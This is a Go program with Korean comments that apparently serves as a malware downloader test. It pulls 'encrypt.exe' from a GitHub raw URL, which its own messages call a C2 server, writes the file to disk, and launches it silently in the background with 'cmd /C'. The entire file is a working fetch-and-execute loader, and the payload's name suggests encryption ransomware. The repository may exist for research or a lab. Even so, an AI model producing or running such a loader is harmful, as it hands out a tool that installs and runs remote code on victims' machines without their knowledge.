package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
)

const (
	PayloadURL    = "https://raw.githubusercontent.com/ParkJeongKyun/C2-test/master/build/encrypt.exe"
	LocalFileName = "encrypt.exe"
)

// 파일 다운로드
func downloadFile(url string, destPath string) error {
	resp, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("HTTP GET 실패: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("서버 응답 에러 (Status Code: %d)", resp.StatusCode)
	}

	out, err := os.Create(destPath)
	if err != nil {
		return fmt.Errorf("로컬 파일 생성 실패: %v", err)
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return fmt.Errorf("파일 쓰기 실패: %v", err)
	}

	return nil
}

// 다운로드 실행
func executePayload(exePath string) error {
	cmd := exec.Command("cmd", "/C", exePath)

	err := cmd.Start()
	if err != nil {
		return fmt.Errorf("프로세스 실행 실패: %v", err)
	}

	fmt.Printf("[+] 페이로드가 백그라운드에서 정상 실행되었습니다. (PID: %d)\n", cmd.Process.Pid)
	return nil
}

func main() {
	destPath := filepath.Join(".", LocalFileName)

	fmt.Printf("[*] C2 서버(%s)로부터 페이로드 다운로드 시도 중...\n", PayloadURL)
	err := downloadFile(PayloadURL, destPath)
	if err != nil {
		fmt.Printf("[-] 다운로드 실패: %v\n", err)
		return
	}
	fmt.Printf("[+] 다운로드 성공: %s\n", destPath)

	fmt.Println("[*] 페이로드 강제 실행 시도 중...")
	err = executePayload(destPath)
	if err != nil {
		fmt.Printf("[-] 실행 실패: %v\n", err)
		return
	}

	fmt.Println("[+] 다운로더 시나리오 완료.")
}
